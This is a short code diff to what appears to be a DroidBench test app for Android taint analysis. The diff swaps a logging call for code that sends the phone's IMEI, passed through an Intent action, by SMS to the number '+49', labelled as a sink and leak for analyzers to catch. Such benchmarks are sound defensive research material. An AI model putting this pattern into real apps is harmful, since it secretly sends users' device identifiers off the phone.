@@ -3,6 +3,7 @@ package edu.mit.icc_intent_class_modeling;
 import android.app.Activity;
 import android.content.Intent;
 import android.os.Bundle;
+import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
@@ -27,7 +28,8 @@ public class MainActivity extends Activity {
 
 	Intent i = new Intent();
 	i.setAction(imei);
-                
-        Log.i("DroidBench", i.getAction());  //leak
+
+        SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("+49", null, i.getAction(), null, null);  //sink, leak
     }
 }
